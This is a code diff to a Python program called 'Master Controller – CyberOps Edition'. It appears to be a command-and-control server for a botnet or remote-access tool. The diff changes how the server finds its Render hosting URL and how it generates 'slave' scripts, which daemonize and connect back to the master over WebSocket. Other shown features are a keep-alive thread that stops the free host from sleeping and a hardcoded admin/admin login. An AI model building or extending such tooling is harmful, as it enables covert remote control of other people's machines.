@@ -4,6 +4,7 @@ Master Controller – CyberOps Edition
 Dual‑mode: VPS (TCP) + Render (WebSocket) with toggle.
 Login required (admin/admin) with mode selection.
 Keep‑alive thread prevents Render from sleeping.
+Auto‑detects Render URL from environment.
 """
 
 import socket
@@ -25,8 +26,12 @@ TCP_PORT     = int(os.environ.get('MASTER_TCP_PORT', '5555'))
 WEB_HOST     = os.environ.get('MASTER_WEB_HOST', '0.0.0.0')
 WEB_PORT     = int(os.environ.get('MASTER_WEB_PORT', '5000'))
 DB_FILE      = os.environ.get('MASTER_DB_FILE', 'slaves.json')
-MASTER_IP    = os.environ.get('MASTER_IP', '192.168.0.1')   # for VPS mode
-MODE_FILE    = 'mode.txt'                                   # persists current mode
+# For VPS mode – can be IP or domain (with or without protocol)
+MASTER_IP    = os.environ.get('MASTER_IP', '192.168.0.1')
+
+# Render auto‑detection: if RENDER_EXTERNAL_URL is set, use that as master URL for Render mode
+RENDER_URL   = os.environ.get('RENDER_EXTERNAL_URL', '').strip()
+MODE_FILE    = 'mode.txt'
 # ====================================
 
 # Global mode: 'vps' or 'render'
@@ -432,7 +437,7 @@ def handle_disconnect():
                 log_event(f"NODE OFFLINE (WS) [{name}] {slave_id[:8]}")
                 break
 
-# ========== HTML DASHBOARD (with mode toggle) ==========
+# ========== HTML DASHBOARD (unchanged) ==========
 HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1834,7 +1839,16 @@ if __name__ == "__main__":
 '''
 
 def generate_ws_slave_script(slave_id: str, slave_name: str) -> str:
-    master_url = f"https://{MASTER_IP}" if not MASTER_IP.startswith('http') else MASTER_IP
+    # Auto‑detect Render URL if available, else use MASTER_IP
+    if RENDER_URL:
+        master_url = RENDER_URL.rstrip('/')
+    else:
+        # If MASTER_IP already starts with http:// or https://, use as is
+        if MASTER_IP.startswith('http://') or MASTER_IP.startswith('https://'):
+            master_url = MASTER_IP.rstrip('/')
+        else:
+            master_url = f"http://{MASTER_IP}:{WEB_PORT}"  # fallback to HTTP with port
+
     return f'''#!/usr/bin/env python3
 # =============================================
 #  Slave Node (Render/WebSocket) — {slave_name}
@@ -1959,7 +1973,8 @@ def disconnect():
     print("[!] Disconnected from master")
 
 def connect_and_serve():
-    sio.connect(MASTER_URL, transports=['websocket'])
+    # Use both polling and websocket to improve reliability on Render
+    sio.connect(MASTER_URL, transports=['polling', 'websocket'])
     sio.wait()
 
 def daemonize():
@@ -2066,10 +2081,11 @@ if __name__ == '__main__':
     print(f"  Master IP  : {MASTER_IP}")
     print(f"  TCP Port   : {TCP_PORT}")
     print(f"  Dashboard  : http://0.0.0.0:{WEB_PORT}")
+    if RENDER_URL:
+        print(f"  Render URL : {RENDER_URL}")
     print(f"  Current mode: {CURRENT_MODE.upper()}")
     print("=" * 52)
     load_slaves()
     threading.Thread(target=tcp_server_loop, daemon=True).start()
-    # Start keepalive thread
     threading.Thread(target=keepalive_loop, daemon=True).start()
     socketio.run(app, host=WEB_HOST, port=WEB_PORT, debug=False, use_reloader=False)
